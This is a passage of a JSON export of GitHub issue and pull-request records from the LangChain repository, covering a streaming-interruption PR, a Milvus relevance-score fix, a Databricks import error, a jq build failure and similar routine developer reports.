        "created_at": "2023-05-09T14:47:17Z",
        "updated_at": "2023-09-02T00:16:40Z",
        "closed_at": "2023-09-02T00:16:39Z",
        "author_association": "CONTRIBUTOR",
        "active_lock_reason": null,
        "draft": false,
        "pull_request": {
            "url": "https://api.github.com/repos/langchain-ai/langchain/pulls/4403",
            "html_url": "https://github.com/langchain-ai/langchain/pull/4403",
            "diff_url": "https://github.com/langchain-ai/langchain/pull/4403.diff",
            "patch_url": "https://github.com/langchain-ai/langchain/pull/4403.patch",
            "merged_at": null
        },
        "body": "# Safely interrupt streaming requests\r\n\r\nEnables raising a `StreamInterruption` exception from a callback handler to interrupt streaming requests.\r\n\r\nHandles cleanup of the underlying HTTP request.\r\n\r\n### More details, example usage\r\n\r\nHere's an example usage of a callback handler that I've tested as working:\r\n\r\n```python\r\nclass VerboseStreamingStdOutCallbackHandler(StreamingStdOutCallbackHandler):\r\n    @property\r\n    def always_verbose(self) -> bool:\r\n        \"\"\"Whether to call verbose callbacks even if verbose is False.\"\"\"\r\n        return True\r\n\r\ndef make_interrupt_streaming_callback_handler(backend):\r\n    class InterruptStreamingCallbackHandler(VerboseStreamingStdOutCallbackHandler):\r\n        def on_llm_new_token(self, token: str, **kwargs: Any) -> None:\r\n            if not backend.streaming:\r\n                message = \"Request to interrupt streaming\"\r\n                backend.log.info(message)\r\n                raise StreamInterruption(message)\r\n    return InterruptStreamingCallbackHandler()\r\n```\r\n\r\nAt this moment, I've only implemented the change for the `_generate` method in the OpenAI Chat LLM. I have not investigated the `_agenerate` method, or any other LLMs yet -- would like to get some feedback/confirmation on the approach first.\r\n\r\n## Who can review?\r\n\r\nCommunity members can review the PR once tests pass. Tag maintainers/contributors who might be interested:\r\n\r\n@agola11 \r\n",
        "reactions": {
            "url": "https://api.github.com/repos/langchain-ai/langchain/issues/4403/reactions",
            "total_count": 3,
            "+1": 2,
            "-1": 0,
            "laugh": 0,
            "hooray": 1,
            "confused": 0,
            "heart": 0,
            "rocket": 0,
            "eyes": 0
        },
        "timeline_url": "https://api.github.com/repos/langchain-ai/langchain/issues/4403/timeline",
        "performed_via_github_app": null,
        "state_reason": null
    },
    {
        "url": "https://api.github.com/repos/langchain-ai/langchain/issues/4402",
        "repository_url": "https://api.github.com/repos/langchain-ai/langchain",
        "labels_url": "https://api.github.com/repos/langchain-ai/langchain/issues/4402/labels{/name}",
        "comments_url": "https://api.github.com/repos/langchain-ai/langchain/issues/4402/comments",
        "events_url": "https://api.github.com/repos/langchain-ai/langchain/issues/4402/events",
        "html_url": "https://github.com/langchain-ai/langchain/pull/4402",
        "id": 1702186599,
        "node_id": "PR_kwDOIPDwls5QGhzA",
        "number": 4402,
        "title": "Make serpapi base url configurable via env",
        "user": {
            "login": "yanghua",
            "id": 2283778,
            "node_id": "MDQ6VXNlcjIyODM3Nzg=",
            "avatar_url": "https://avatars.githubusercontent.com/u/2283778?v=4",
            "gravatar_id": "",
            "url": "https://api.github.com/users/yanghua",
            "html_url": "https://github.com/yanghua",
            "followers_url": "https://api.github.com/users/yanghua/followers",
            "following_url": "https://api.github.com/users/yanghua/following{/other_user}",
            "gists_url": "https://api.github.com/users/yanghua/gists{/gist_id}",
            "starred_url": "https://api.github.com/users/yanghua/starred{/owner}{/repo}",
            "subscriptions_url": "https://api.github.com/users/yanghua/subscriptions",
            "organizations_url": "https://api.github.com/users/yanghua/orgs",
            "repos_url": "https://api.github.com/users/yanghua/repos",
            "events_url": "https://api.github.com/users/yanghua/events{/privacy}",
            "received_events_url": "https://api.github.com/users/yanghua/received_events",
            "type": "User",
            "site_admin": false
        },
        "labels": [],
        "state": "closed",
        "locked": false,
        "assignee": null,
        "assignees": [],
        "milestone": null,
        "comments": 6,
        "created_at": "2023-05-09T14:42:23Z",
        "updated_at": "2023-05-16T13:42:06Z",
        "closed_at": "2023-05-15T21:25:25Z",
        "author_association": "CONTRIBUTOR",
        "active_lock_reason": null,
        "draft": false,
        "pull_request": {
            "url": "https://api.github.com/repos/langchain-ai/langchain/pulls/4402",
            "html_url": "https://github.com/langchain-ai/langchain/pull/4402",
            "diff_url": "https://github.com/langchain-ai/langchain/pull/4402.diff",
            "patch_url": "https://github.com/langchain-ai/langchain/pull/4402.patch",
            "merged_at": "2023-05-15T21:25:25Z"
        },
        "body": "# Make serpapi base url configurable via env\r\n\r\n<!--\r\nThank you for contributing to LangChain! Your PR will appear in our next release under the title you set. Please make sure it highlights your valuable contribution.\r\n\r\nReplace this with a description of the change, the issue it fixes (if applicable), and relevant context. List any dependencies required for this change.\r\n\r\nAfter you're done, someone will review your PR. They may suggest improvements. If no one reviews your PR within a few days, feel free to @-mention the same people again, as notifications can get lost.\r\n-->\r\n\r\n<!-- Remove if not applicable -->\r\n\r\nFixes #4328\r\n\r\n## Before submitting\r\n\r\n<!-- If you're adding a new integration, include an integration test and an example notebook showing its use! -->\r\n\r\n## Who can review?\r\n\r\nCommunity members can review the PR once tests pass. Tag maintainers/contributors who might be interested:\r\n\r\n<!-- For a quicker response, figure out the right person to tag with @\r\n\r\n        @hwchase17 - project lead\r\n\r\n        Tracing / Callbacks\r\n        - @agola11\r\n\r\n        Async\r\n        - @agola11\r\n\r\n        DataLoader Abstractions\r\n        - @eyurtsev\r\n\r\n        LLM/Chat Wrappers\r\n        - @hwchase17\r\n        - @agola11\r\n\r\n        Tools / Toolkits\r\n        - @vowelparrot\r\n -->\r\n\r\n@vowelparrot \r\n",
        "reactions": {
            "url": "https://api.github.com/repos/langchain-ai/langchain/issues/4402/reactions",
            "total_count": 0,
            "+1": 0,
            "-1": 0,
            "laugh": 0,
            "hooray": 0,
            "confused": 0,
            "heart": 0,
            "rocket": 0,
            "eyes": 0
        },
        "timeline_url": "https://api.github.com/repos/langchain-ai/langchain/issues/4402/timeline",
        "performed_via_github_app": null,
        "state_reason": null
    },
    {
        "url": "https://api.github.com/repos/langchain-ai/langchain/issues/4401",
        "repository_url": "https://api.github.com/repos/langchain-ai/langchain",
        "labels_url": "https://api.github.com/repos/langchain-ai/langchain/issues/4401/labels{/name}",
        "comments_url": "https://api.github.com/repos/langchain-ai/langchain/issues/4401/comments",
        "events_url": "https://api.github.com/repos/langchain-ai/langchain/issues/4401/events",
        "html_url": "https://github.com/langchain-ai/langchain/issues/4401",
        "id": 1702155760,
        "node_id": "I_kwDOIPDwls5ldNXw",
        "number": 4401,
        "title": "ERROR-Import  Langchain :  TypeError: dataclass_transform() got an unexpected keyword argument 'field_specifiers'",
        "user": {
            "login": "Abonia1",
            "id": 22887323,
            "node_id": "MDQ6VXNlcjIyODg3MzIz",
            "avatar_url": "https://avatars.githubusercontent.com/u/22887323?v=4",
            "gravatar_id": "",
            "url": "https://api.github.com/users/Abonia1",
            "html_url": "https://github.com/Abonia1",
            "followers_url": "https://api.github.com/users/Abonia1/followers",
            "following_url": "https://api.github.com/users/Abonia1/following{/other_user}",
            "gists_url": "https://api.github.com/users/Abonia1/gists{/gist_id}",
            "starred_url": "https://api.github.com/users/Abonia1/starred{/owner}{/repo}",
            "subscriptions_url": "https://api.github.com/users/Abonia1/subscriptions",
            "organizations_url": "https://api.github.com/users/Abonia1/orgs",
            "repos_url": "https://api.github.com/users/Abonia1/repos",
            "events_url": "https://api.github.com/users/Abonia1/events{/privacy}",
            "received_events_url": "https://api.github.com/users/Abonia1/received_events",
            "type": "User",
            "site_admin": false
        },
        "labels": [],
        "state": "closed",
        "locked": false,
        "assignee": null,
        "assignees": [],
        "milestone": null,
        "comments": 26,
        "created_at": "2023-05-09T14:25:59Z",
        "updated_at": "2023-11-14T16:08:49Z",
        "closed_at": "2023-11-14T16:08:49Z",
        "author_association": "CONTRIBUTOR",
        "active_lock_reason": null,
        "body": "In databricks  I  cant able to import langchain.\r\n\r\n\r\n`TypeError: dataclass_transform() got an unexpected keyword argument 'field_specifiers'`\r\n<img width=\"1266\" alt=\"Capture d\u2019e\u0301cran 2023-05-09 a\u0300 16 18 05\" src=\"https://github.com/hwchase17/langchain/assets/22887323/dad2700a-ad90-4d36-bb25-c5c00e6eb42f\">\r\n\r\nThanks in advance.",
        "reactions": {
            "url": "https://api.github.com/repos/langchain-ai/langchain/issues/4401/reactions",
            "total_count": 3,
            "+1": 3,
            "-1": 0,
            "laugh": 0,
            "hooray": 0,
            "confused": 0,
            "heart": 0,
            "rocket": 0,
            "eyes": 0
        },
        "timeline_url": "https://api.github.com/repos/langchain-ai/langchain/issues/4401/timeline",
        "performed_via_github_app": null,
        "state_reason": "not_planned"
    },
    {
        "url": "https://api.github.com/repos/langchain-ai/langchain/issues/4400",
        "repository_url": "https://api.github.com/repos/langchain-ai/langchain",
        "labels_url": "https://api.github.com/repos/langchain-ai/langchain/issues/4400/labels{/name}",
        "comments_url": "https://api.github.com/repos/langchain-ai/langchain/issues/4400/comments",
        "events_url": "https://api.github.com/repos/langchain-ai/langchain/issues/4400/events",
        "html_url": "https://github.com/langchain-ai/langchain/pull/4400",
        "id": 1702127602,
        "node_id": "PR_kwDOIPDwls5QGVP8",
        "number": 4400,
        "title": "Correct AutoGPT import in autogpt.ipynb",
        "user": {
            "login": "juliencarponcy",
            "id": 41296546,
            "node_id": "MDQ6VXNlcjQxMjk2NTQ2",
            "avatar_url": "https://avatars.githubusercontent.com/u/41296546?v=4",
            "gravatar_id": "",
            "url": "https://api.github.com/users/juliencarponcy",
            "html_url": "https://github.com/juliencarponcy",
            "followers_url": "https://api.github.com/users/juliencarponcy/followers",
            "following_url": "https://api.github.com/users/juliencarponcy/following{/other_user}",
            "gists_url": "https://api.github.com/users/juliencarponcy/gists{/gist_id}",
            "starred_url": "https://api.github.com/users/juliencarponcy/starred{/owner}{/repo}",
            "subscriptions_url": "https://api.github.com/users/juliencarponcy/subscriptions",
            "organizations_url": "https://api.github.com/users/juliencarponcy/orgs",
            "repos_url": "https://api.github.com/users/juliencarponcy/repos",
            "events_url": "https://api.github.com/users/juliencarponcy/events{/privacy}",
            "received_events_url": "https://api.github.com/users/juliencarponcy/received_events",
            "type": "User",
            "site_admin": false
        },
        "labels": [],
        "state": "closed",
        "locked": false,
        "assignee": null,
        "assignees": [],
        "milestone": null,
        "comments": 2,
        "created_at": "2023-05-09T14:10:47Z",
        "updated_at": "2023-05-16T04:21:39Z",
        "closed_at": "2023-05-16T04:21:39Z",
        "author_association": "NONE",
        "active_lock_reason": null,
        "draft": false,
        "pull_request": {
            "url": "https://api.github.com/repos/langchain-ai/langchain/pulls/4400",
            "html_url": "https://github.com/langchain-ai/langchain/pull/4400",
            "diff_url": "https://github.com/langchain-ai/langchain/pull/4400.diff",
            "patch_url": "https://github.com/langchain-ai/langchain/pull/4400.patch",
            "merged_at": null
        },
        "body": "Take into account modification of the structure of the experimental folder to load the AutoGPT class\r\n\r\n# Correct AutoGPT import in autogpt.ipynb considering new experimental folder structure\r\n\r\nThe former block in  https://python.langchain.com/en/latest/use_cases/autonomous_agents/autogpt.html :\r\n\r\n```\r\nfrom langchain.experimental import AutoGPT\r\nfrom langchain.chat_models import ChatOpenAI\r\n```\r\nWas not loading AutoGPT as the structure of the experimental folder changed. \r\nThis PR fixes module import for AutoGPT\r\n\r\n## Who can review?\r\n\r\nCommunity members can review the PR once tests pass. Tag maintainers/contributors who might be interested: @vowelparrot ?\r\n\r\n",
        "reactions": {
            "url": "https://api.github.com/repos/langchain-ai/langchain/issues/4400/reactions",
            "total_count": 0,
            "+1": 0,
            "-1": 0,
            "laugh": 0,
            "hooray": 0,
            "confused": 0,
            "heart": 0,
            "rocket": 0,
            "eyes": 0
        },
        "timeline_url": "https://api.github.com/repos/langchain-ai/langchain/issues/4400/timeline",
        "performed_via_github_app": null,
        "state_reason": null
    },
    {
        "url": "https://api.github.com/repos/langchain-ai/langchain/issues/4399",
        "repository_url": "https://api.github.com/repos/langchain-ai/langchain",
        "labels_url": "https://api.github.com/repos/langchain-ai/langchain/issues/4399/labels{/name}",
        "comments_url": "https://api.github.com/repos/langchain-ai/langchain/issues/4399/comments",
        "events_url": "https://api.github.com/repos/langchain-ai/langchain/issues/4399/events",
        "html_url": "https://github.com/langchain-ai/langchain/issues/4399",
        "id": 1702126607,
        "node_id": "I_kwDOIPDwls5ldGQP",
        "number": 4399,
        "title": "[Feature Request] update and delete index operation on Weaviate vectorstore  ",
        "user": {
            "login": "sudhanshu746",
            "id": 3050735,
            "node_id": "MDQ6VXNlcjMwNTA3MzU=",
            "avatar_url": "https://avatars.githubusercontent.com/u/3050735?v=4",
            "gravatar_id": "",
            "url": "https://api.github.com/users/sudhanshu746",
            "html_url": "https://github.com/sudhanshu746",
            "followers_url": "https://api.github.com/users/sudhanshu746/followers",
            "following_url": "https://api.github.com/users/sudhanshu746/following{/other_user}",
            "gists_url": "https://api.github.com/users/sudhanshu746/gists{/gist_id}",
            "starred_url": "https://api.github.com/users/sudhanshu746/starred{/owner}{/repo}",
            "subscriptions_url": "https://api.github.com/users/sudhanshu746/subscriptions",
            "organizations_url": "https://api.github.com/users/sudhanshu746/orgs",
            "repos_url": "https://api.github.com/users/sudhanshu746/repos",
            "events_url": "https://api.github.com/users/sudhanshu746/events{/privacy}",
            "received_events_url": "https://api.github.com/users/sudhanshu746/received_events",
            "type": "User",
            "site_admin": false
        },
        "labels": [],
        "state": "closed",
        "locked": false,
        "assignee": null,
        "assignees": [],
        "milestone": null,
        "comments": 3,
        "created_at": "2023-05-09T14:10:15Z",
        "updated_at": "2023-09-19T16:11:32Z",
        "closed_at": "2023-09-19T16:11:31Z",
        "author_association": "NONE",
        "active_lock_reason": null,
        "body": "### Feature request\n\nCurrently, Weaviate vectorstore doesn't provide option for updation of vector embeddings on existing index and deletion of index.\r\n\r\n\r\n \n\n### Motivation\n\nThis feature request is related to an experiment project for which we need CRUD operations on Weaviate vectorstore.\r\n\n\n### Your contribution\n\nI can provide my contribution if no one is currently working on this request.",
        "reactions": {
            "url": "https://api.github.com/repos/langchain-ai/langchain/issues/4399/reactions",
            "total_count": 3,
            "+1": 2,
            "-1": 0,
            "laugh": 0,
            "hooray": 0,
            "confused": 0,
            "heart": 0,
            "rocket": 0,
            "eyes": 1
        },
        "timeline_url": "https://api.github.com/repos/langchain-ai/langchain/issues/4399/timeline",
        "performed_via_github_app": null,
        "state_reason": "not_planned"
    },
    {
        "url": "https://api.github.com/repos/langchain-ai/langchain/issues/4398",
        "repository_url": "https://api.github.com/repos/langchain-ai/langchain",
        "labels_url": "https://api.github.com/repos/langchain-ai/langchain/issues/4398/labels{/name}",
        "comments_url": "https://api.github.com/repos/langchain-ai/langchain/issues/4398/comments",
        "events_url": "https://api.github.com/repos/langchain-ai/langchain/issues/4398/events",
        "html_url": "https://github.com/langchain-ai/langchain/pull/4398",
        "id": 1702099290,
        "node_id": "PR_kwDOIPDwls5QGPBx",
        "number": 4398,
        "title": "add milvus _similarity_search_with_relevance_scores",
        "user": {
            "login": "ItachiJxy",
            "id": 49740903,
            "node_id": "MDQ6VXNlcjQ5NzQwOTAz",
            "avatar_url": "https://avatars.githubusercontent.com/u/49740903?v=4",
            "gravatar_id": "",
            "url": "https://api.github.com/users/ItachiJxy",
            "html_url": "https://github.com/ItachiJxy",
            "followers_url": "https://api.github.com/users/ItachiJxy/followers",
            "following_url": "https://api.github.com/users/ItachiJxy/following{/other_user}",
            "gists_url": "https://api.github.com/users/ItachiJxy/gists{/gist_id}",
            "starred_url": "https://api.github.com/users/ItachiJxy/starred{/owner}{/repo}",
            "subscriptions_url": "https://api.github.com/users/ItachiJxy/subscriptions",
            "organizations_url": "https://api.github.com/users/ItachiJxy/orgs",
            "repos_url": "https://api.github.com/users/ItachiJxy/repos",
            "events_url": "https://api.github.com/users/ItachiJxy/events{/privacy}",
            "received_events_url": "https://api.github.com/users/ItachiJxy/received_events",
            "type": "User",
            "site_admin": false
        },
        "labels": [
            {
                "id": 5541432778,
                "node_id": "LA_kwDOIPDwls8AAAABSkuNyg",
                "url": "https://api.github.com/repos/langchain-ai/langchain/labels/area:%20vector%20store",
                "name": "area: vector store",
                "color": "D4C5F9",
                "default": false,
                "description": "Related to vector store module"
            },
            {
                "id": 5680700839,
                "node_id": "LA_kwDOIPDwls8AAAABUpidpw",
                "url": "https://api.github.com/repos/langchain-ai/langchain/labels/auto:bug",
                "name": "auto:bug",
                "color": "E99695",
                "default": false,
                "description": "Related to a bug, vulnerability, unexpected error with an existing feature"
            }
        ],
        "state": "closed",
        "locked": false,
        "assignee": null,
        "assignees": [],
        "milestone": null,
        "comments": 2,
        "created_at": "2023-05-09T13:58:25Z",
        "updated_at": "2023-08-01T01:02:27Z",
        "closed_at": "2023-08-01T01:02:27Z",
        "author_association": "NONE",
        "active_lock_reason": null,
        "draft": false,
        "pull_request": {
            "url": "https://api.github.com/repos/langchain-ai/langchain/pulls/4398",
            "html_url": "https://github.com/langchain-ai/langchain/pull/4398",
            "diff_url": "https://github.com/langchain-ai/langchain/pull/4398.diff",
            "patch_url": "https://github.com/langchain-ai/langchain/pull/4398.patch",
            "merged_at": null
        },
        "body": "When I used the generative agent code of the virtual town, I used milvus, but reported the following unimplemented error\r\n\r\n<!--\r\nThank you for contributing to LangChain! Your PR will appear in our next release under the title you set. Please make sure it highlights your valuable contribution.\r\n\r\nReplace this with a description of the change, the issue it fixes (if applicable), and relevant context. List any dependencies required for this change.\r\n\r\nAfter you're done, someone will review your PR. They may suggest improvements. If no one reviews your PR within a few days, feel free to @-mention the same people again, as notifications can get lost.\r\n-->\r\n\r\n<!-- Remove if not applicable -->\r\n\r\n```\r\nTraceback (most recent call last):\r\n  File \"/Users/jxyxiangyu/project/smartMarketing/agent/demo_for_chat.py\", line 103, in <module>\r\n    print(tommie.get_summary())\r\n          ^^^^^^^^^^^^^^^^^^^^\r\n  File \"/usr/local/lib/python3.11/site-packages/langchain/experimental/generative_agents/generative_agent.py\", line 215, in get_summary\r\n    self.summary = self._compute_agent_summary()\r\n                   ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^\r\n  File \"/usr/local/lib/python3.11/site-packages/langchain/experimental/generative_agents/generative_agent.py\", line 202, in _compute_agent_summary\r\n    .run(name=self.name, queries=[f\"{self.name}'s core characteristics\"])\r\n     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^\r\n  File \"/usr/local/lib/python3.11/site-packages/langchain/chains/base.py\", line 239, in run\r\n    return self(kwargs, callbacks=callbacks)[self.output_keys[0]]\r\n           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^\r\n  File \"/usr/local/lib/python3.11/site-packages/langchain/chains/base.py\", line 123, in __call__\r\n    inputs = self.prep_inputs(inputs)\r\n             ^^^^^^^^^^^^^^^^^^^^^^^^\r\n  File \"/usr/local/lib/python3.11/site-packages/langchain/chains/base.py\", line 214, in prep_inputs\r\n    external_context = self.memory.load_memory_variables(inputs)\r\n                       ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^\r\n  File \"/usr/local/lib/python3.11/site-packages/langchain/experimental/generative_agents/memory.py\", line 183, in load_memory_variables\r\n    relevant_memories = [\r\n                        ^\r\n  File \"/usr/local/lib/python3.11/site-packages/langchain/experimental/generative_agents/memory.py\", line 184, in <listcomp>\r\n    mem for query in queries for mem in self.fetch_memories(query)\r\n                                        ^^^^^^^^^^^^^^^^^^^^^^^^^^\r\n  File \"/usr/local/lib/python3.11/site-packages/langchain/experimental/generative_agents/memory.py\", line 147, in fetch_memories\r\n    return self.memory_retriever.get_relevant_documents(observation)\r\n           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^\r\n  File \"/usr/local/lib/python3.11/site-packages/langchain/retrievers/time_weighted_retriever.py\", line 91, in get_relevant_documents\r\n    docs_and_scores.update(self.get_salient_docs(query))\r\n                           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^\r\n  File \"/usr/local/lib/python3.11/site-packages/langchain/retrievers/time_weighted_retriever.py\", line 72, in get_salient_docs\r\n    docs_and_scores = self.vectorstore.similarity_search_with_relevance_scores(\r\n                      ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^\r\n  File \"/usr/local/lib/python3.11/site-packages/langchain/vectorstores/base.py\", line 120, in similarity_search_with_relevance_scores\r\n    docs_and_similarities = self._similarity_search_with_relevance_scores(\r\n                            ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^\r\n  File \"/usr/local/lib/python3.11/site-packages/langchain/vectorstores/base.py\", line 143, in _similarity_search_with_relevance_scores\r\n    raise NotImplementedError\r\nNotImplementedError\r\n```\r\n\r\nSo, I implement _similarity_search_with_relevance_scores function in milvus.py\r\n\r\nFixes when using milvus, it will raise _similarity_search_with_relevance_scores not implemented\r\n\r\n<!-- If you're adding a new integration, include an integration test and an example notebook showing its use! -->\r\n\r\n## Who can review?\r\n\r\nCommunity members can review the PR once tests pass. Tag maintainers/contributors who might be interested:\r\n\r\n@hwchase17\r\n\r\n<!-- For a quicker response, figure out the right person to tag with @\r\n\r\n        @hwchase17 - project lead\r\n\r\n        Tracing / Callbacks\r\n        - @agola11\r\n\r\n        Async\r\n        - @agola11\r\n\r\n        DataLoader Abstractions\r\n        - @eyurtsev\r\n\r\n        LLM/Chat Wrappers\r\n        - @hwchase17\r\n        - @agola11\r\n\r\n        Tools / Toolkits\r\n        - @vowelparrot\r\n -->\r\n",
        "reactions": {
            "url": "https://api.github.com/repos/langchain-ai/langchain/issues/4398/reactions",
            "total_count": 0,
            "+1": 0,
            "-1": 0,
            "laugh": 0,
            "hooray": 0,
            "confused": 0,
            "heart": 0,
            "rocket": 0,
            "eyes": 0
        },
        "timeline_url": "https://api.github.com/repos/langchain-ai/langchain/issues/4398/timeline",
        "performed_via_github_app": null,
        "state_reason": null
    },
    {
        "url": "https://api.github.com/repos/langchain-ai/langchain/issues/4397",
        "repository_url": "https://api.github.com/repos/langchain-ai/langchain",
        "labels_url": "https://api.github.com/repos/langchain-ai/langchain/issues/4397/labels{/name}",
        "comments_url": "https://api.github.com/repos/langchain-ai/langchain/issues/4397/comments",
        "events_url": "https://api.github.com/repos/langchain-ai/langchain/issues/4397/events",
        "html_url": "https://github.com/langchain-ai/langchain/issues/4397",
        "id": 1702053499,
        "node_id": "I_kwDOIPDwls5lc0Z7",
        "number": 4397,
        "title": "Agent not getting time spans correctly..",
        "user": {
            "login": "eht-ld",
            "id": 129382140,
            "node_id": "U_kgDOB7Y2_A",
            "avatar_url": "https://avatars.githubusercontent.com/u/129382140?v=4",
            "gravatar_id": "",
            "url": "https://api.github.com/users/eht-ld",
            "html_url": "https://github.com/eht-ld",
            "followers_url": "https://api.github.com/users/eht-ld/followers",
            "following_url": "https://api.github.com/users/eht-ld/following{/other_user}",
            "gists_url": "https://api.github.com/users/eht-ld/gists{/gist_id}",
            "starred_url": "https://api.github.com/users/eht-ld/starred{/owner}{/repo}",
            "subscriptions_url": "https://api.github.com/users/eht-ld/subscriptions",
            "organizations_url": "https://api.github.com/users/eht-ld/orgs",
            "repos_url": "https://api.github.com/users/eht-ld/repos",
            "events_url": "https://api.github.com/users/eht-ld/events{/privacy}",
            "received_events_url": "https://api.github.com/users/eht-ld/received_events",
            "type": "User",
            "site_admin": false
        },
        "labels": [],
        "state": "closed",
        "locked": false,
        "assignee": null,
        "assignees": [],
        "milestone": null,
        "comments": 3,
        "created_at": "2023-05-09T13:34:39Z",
        "updated_at": "2023-09-15T16:14:28Z",
        "closed_at": "2023-09-15T16:14:28Z",
        "author_association": "NONE",
        "active_lock_reason": null,
        "body": "### Issue you'd like to raise.\n\nHey, we are trying to make use of a pandas dataframe agent. Most querys are working quite good but we cant get it working with time span querys. If we ask the agent \"what date is it?\" the answer is correct. But if we ask give me the revenue of the last week...the pandas query it generates is syntactically correct but the dates are completely off...\r\n\r\nHas anyone idea how to fix this? Thanks!\n\n### Suggestion:\n\n_No response_",
        "reactions": {
            "url": "https://api.github.com/repos/langchain-ai/langchain/issues/4397/reactions",
            "total_count": 0,
            "+1": 0,
            "-1": 0,
            "laugh": 0,
            "hooray": 0,
            "confused": 0,
            "heart": 0,
            "rocket": 0,
            "eyes": 0
        },
        "timeline_url": "https://api.github.com/repos/langchain-ai/langchain/issues/4397/timeline",
        "performed_via_github_app": null,
        "state_reason": "not_planned"
    },
    {
        "url": "https://api.github.com/repos/langchain-ai/langchain/issues/4396",
        "repository_url": "https://api.github.com/repos/langchain-ai/langchain",
        "labels_url": "https://api.github.com/repos/langchain-ai/langchain/issues/4396/labels{/name}",
        "comments_url": "https://api.github.com/repos/langchain-ai/langchain/issues/4396/comments",
        "events_url": "https://api.github.com/repos/langchain-ai/langchain/issues/4396/events",
        "html_url": "https://github.com/langchain-ai/langchain/issues/4396",
        "id": 1701984751,
        "node_id": "I_kwDOIPDwls5lcjnv",
        "number": 4396,
        "title": "Building wheels for collected package: jq failed in Windows",
        "user": {
            "login": "AlbelTec",
            "id": 111683547,
            "node_id": "U_kgDOBqgn2w",
            "avatar_url": "https://avatars.githubusercontent.com/u/111683547?v=4",
            "gravatar_id": "",
            "url": "https://api.github.com/users/AlbelTec",
            "html_url": "https://github.com/AlbelTec",
            "followers_url": "https://api.github.com/users/AlbelTec/followers",
            "following_url": "https://api.github.com/users/AlbelTec/following{/other_user}",
            "gists_url": "https://api.github.com/users/AlbelTec/gists{/gist_id}",
            "starred_url": "https://api.github.com/users/AlbelTec/starred{/owner}{/repo}",
            "subscriptions_url": "https://api.github.com/users/AlbelTec/subscriptions",
            "organizations_url": "https://api.github.com/users/AlbelTec/orgs",
            "repos_url": "https://api.github.com/users/AlbelTec/repos",
            "events_url": "https://api.github.com/users/AlbelTec/events{/privacy}",
            "received_events_url": "https://api.github.com/users/AlbelTec/received_events",
            "type": "User",
            "site_admin": false
        },
        "labels": [],
        "state": "open",
        "locked": false,
        "assignee": null,
        "assignees": [],
        "milestone": null,
        "comments": 18,
        "created_at": "2023-05-09T12:58:59Z",
        "updated_at": "2023-10-23T22:38:00Z",
        "closed_at": null,
        "author_association": "NONE",
        "active_lock_reason": null,
        "body": "### System Info\n\nHi, can't update langchain. any insight ?\r\n\r\n```\r\nBuilding wheels for collected packages: jq\r\n  Building wheel for jq (pyproject.toml) ... error\r\n  error: subprocess-exited-with-error\r\n\r\n  \u00d7 Building wheel for jq (pyproject.toml) did not run successfully.\r\n  \u2502 exit code: 1\r\n  \u2570\u2500> [5 lines of output]\r\n      running bdist_wheel\r\n      running build\r\n      running build_ext\r\n      Executing: ./configure CFLAGS=-fPIC --prefix=C:\\Users\\mysuser\\AppData\\Local\\Temp\\pip-install-7643mu3e\\jq_64b3898552df463e990cf884cae8a414\\_deps\\build\\onig-install-6.9.4\r\n      error: [WinError 2] The system cannot find the file specified\r\n      [end of output]\r\n\r\n  note: This error originates from a subprocess, and is likely not a problem with pip.\r\n  ERROR: Failed building wheel for jq\r\nFailed to build jq\r\nERROR: Could not build wheels for jq, which is required to install pyproject.toml-based projects\r\n```\n\n### Who can help?\n\n_No response_\n\n### Information\n\n- [ ] The official example notebooks/scripts\n- [ ] My own modified scripts\n\n### Related Components\n\n- [ ] LLMs/Chat Models\n- [ ] Embedding Models\n- [ ] Prompts / Prompt Templates / Prompt Selectors\n- [ ] Output Parsers\n- [ ] Document Loaders\n- [ ] Vector Stores / Retrievers\n- [ ] Memory\n- [ ] Agents / Agent Executors\n- [ ] Tools / Toolkits\n- [ ] Chains\n- [ ] Callbacks/Tracing\n- [ ] Async\n\n### Reproduction\n\npip install langchain[all] --upgrade\n\n### Expected behavior\n\nno issue during installtion",
        "reactions": {
            "url": "https://api.github.com/repos/langchain-ai/langchain/issues/4396/reactions",
            "total_count": 4,
            "+1": 4,
            "-1": 0,
            "laugh": 0,
            "hooray": 0,
            "confused": 0,
            "heart": 0,
            "rocket": 0,
            "eyes": 0
        },
        "timeline_url": "https://api.github.com/repos/langchain-ai/langchain/issues/4396/timeline",
        "performed_via_github_app": null,
        "state_reason": null
    },
    {
        "url": "https://api.github.com/repos/langchain-ai/langchain/issues/4395",
        "repository_url": "https://api.github.com/repos/langchain-ai/langchain",
        "labels_url": "https://api.github.com/repos/langchain-ai/langchain/issues/4395/labels{/name}",
        "comments_url": "https://api.github.com/repos/langchain-ai/langchain/issues/4395/comments",
        "events_url": "https://api.github.com/repos/langchain-ai/langchain/issues/4395/events",
        "html_url": "https://github.com/langchain-ai/langchain/issues/4395",
        "id": 1701981229,
        "node_id": "I_kwDOIPDwls5lciwt",
        "number": 4395,
        "title": "Weaviate Vectorstore not initialized with Azure OpenAI embeddings",
        "user": {
            "login": "sudhanshu746",
            "id": 3050735,
            "node_id": "MDQ6VXNlcjMwNTA3MzU=",
            "avatar_url": "https://avatars.githubusercontent.com/u/3050735?v=4",
            "gravatar_id": "",
            "url": "https://api.github.com/users/sudhanshu746",
            "html_url": "https://github.com/sudhanshu746",
            "followers_url": "https://api.github.com/users/sudhanshu746/followers",
            "following_url": "https://api.github.com/users/sudhanshu746/following{/other_user}",
            "gists_url": "https://api.github.com/users/sudhanshu746/gists{/gist_id}",
            "starred_url": "https://api.github.com/users/sudhanshu746/starred{/owner}{/repo}",
            "subscriptions_url": "https://api.github.com/users/sudhanshu746/subscriptions",
            "organizations_url": "https://api.github.com/users/sudhanshu746/orgs",
            "repos_url": "https://api.github.com/users/sudhanshu746/repos",
            "events_url": "https://api.github.com/users/sudhanshu746/events{/privacy}",
            "received_events_url": "https://api.github.com/users/sudhanshu746/received_events",
            "type": "User",
            "site_admin": false
        },
        "labels": [],
        "state": "closed",
        "locked": false,
        "assignee": null,
        "assignees": [],
        "milestone": null,
        "comments": 5,
